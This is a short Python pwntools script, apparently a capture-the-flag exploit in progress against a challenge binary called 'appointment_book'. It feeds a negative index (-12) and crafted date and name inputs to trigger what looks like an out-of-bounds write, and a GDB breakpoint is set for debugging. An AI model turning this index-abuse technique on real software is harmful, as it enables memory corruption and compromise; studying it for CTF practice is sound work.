#!/usr/bin/python3

from pwn import *

exe = ELF('appointment_book', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* create_appointment+367

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
sla(b"Your choice: ", b"2")
sla(b"(0-7): ", b"-12")
sla(b": ", b"1970-2-18 22:27:2")
sla(b": ", b"a"*30)

# sla(b"Your choice: ", b"2")
# sla(b"(0-7): ", b"0")
# sla(b": ", b"1111-11-11 11:11:11")
# sla(b": ", b"a"*61)
p.interactive()
